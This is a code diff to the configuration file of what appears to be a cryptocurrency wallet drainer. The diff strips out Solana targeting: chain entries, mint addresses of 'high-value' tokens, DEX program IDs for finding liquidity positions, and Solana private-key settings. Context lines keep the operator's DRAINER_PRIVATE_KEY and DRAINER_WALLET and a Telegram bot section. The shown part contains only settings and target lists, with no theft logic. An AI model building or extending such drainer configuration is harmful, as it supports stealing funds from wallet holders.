@@ -14,9 +14,6 @@ load_dotenv(env_path)
 # Sepolia RPC override for environments with private or key-based providers
 SEPOLIA_RPC = os.getenv("SEPOLIA_RPC", "https://rpc.sepolia.org")
 
-# Solana RPC override for environments with custom cluster endpoints
-SOLANA_RPC = os.getenv("SOLANA_RPC", "")
-
 # ============================================================
 # NETWORK CONFIGURATION
 # ============================================================
@@ -120,60 +117,6 @@ CHAIN_CONFIG = {
             "0x50b7545627a5162F82A992c33b87aDc75187B218",  # WBTC (Avalanche)
         ]
     },
-
-    # ── SOLANA (NON-EVM) ─────────────────────────────────────
-    "solana_devnet": {
-        "chain_type": "solana",
-        "chain_id": 103,  # Solana devnet cluster ID
-        "rpc": "https://api.devnet.solana.com",
-        "rpc_wss": "wss://api.devnet.solana.com",
-        "explorer": "https://explorer.solana.com?cluster=devnet",
-        "currency": "SOL",
-        "decimals": 9,
-        "high_value_tokens": {},
-        "dex_programs": {}
-    },
-    "solana_testnet": {
-        "chain_type": "solana",
-        "chain_id": 102,  # Solana testnet cluster ID
-        "rpc": "https://api.testnet.solana.com",
-        "rpc_wss": "wss://api.testnet.solana.com",
-        "explorer": "https://explorer.solana.com?cluster=testnet",
-        "currency": "SOL",
-        "decimals": 9,
-        "high_value_tokens": {},
-        "dex_programs": {}
-    },
-    "solana": {
-        "chain_type": "solana",
-        "chain_id": 101,  # Solana mainnet-beta cluster ID
-        "rpc": "https://api.mainnet-beta.solana.com",
-        "rpc_wss": "wss://api.mainnet-beta.solana.com",
-        "explorer": "https://solscan.io",
-        "currency": "SOL",
-        "decimals": 9,
-        # High-value SPL token mint addresses
-        "high_value_tokens": {
-            "SOL": "So11111111111111111111111111111111111111112",        # Native SOL (wrapped)
-            "USDC": "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",   # USD Coin
-            "USDT": "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",   # Tether
-            "RAY":  "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R",   # Raydium
-            "SRM":  "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt",     # Serum
-            "JUP":  "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",     # Jupiter
-            "BONK": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",   # Bonk
-            "WIF":  "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm",   # dogwifhat
-            "PYTH": "HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3",   # Pyth Network
-            "JTO":  "jtojtomepa8beP8AuQc6eXt5FriJwfFMwQx2v2f9mCL",    # Jito
-        },
-        # DEX program IDs for checking LP positions
-        "dex_programs": {
-            "raydium_amm": "675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8",
-            "raydium_clmm": "CAMMCzo5YL8w4VFF8KVHrK22GGUsp5VTaW7grrKgrWqK",
-            "jupiter_aggregator": "JUP6LkbZbjS1jKKwapdHX74JKafrcQQMTqpMMm1nYb7",
-            "orca_whirlpools": "whirLbMiicVdio4qvUfM5KAg6Ct8VwpYzGff3uctyCc",
-            "meteora_dlmm": "LBUZKhRxPF3XUpBCjp4YzTKgLccjZh656DM3bbcF5fE",
-        }
-    },
 }
 
 # ============================================================
@@ -186,10 +129,6 @@ DEFAULT_CHAIN = os.getenv("DEFAULT_CHAIN", "ethereum")
 # ============================================================
 YOUR_PRIVATE_KEY = os.getenv("DRAINER_PRIVATE_KEY", "")
 YOUR_WALLET_ADDRESS = os.getenv("DRAINER_WALLET", "")
-
-# Solana-specific: your Solana wallet's base58 private key
-SOLANA_PRIVATE_KEY = os.getenv("SOLANA_PRIVATE_KEY", "")
-SOLANA_WALLET_ADDRESS = os.getenv("SOLANA_WALLET_ADDRESS", "")
 
 # ============================================================
 # TELEGRAM BOT — FROM .ENV
@@ -262,9 +201,3 @@ def is_evm_chain(chain_name):
     """Check if a chain is EVM-based."""
     config = get_chain_config(chain_name)
     return config and config.get("chain_type") == "evm"
-
-
-def is_solana_chain(chain_name):
-    """Check if a chain is Solana."""
-    config = get_chain_config(chain_name)
-    return config and config.get("chain_type") == "solana"
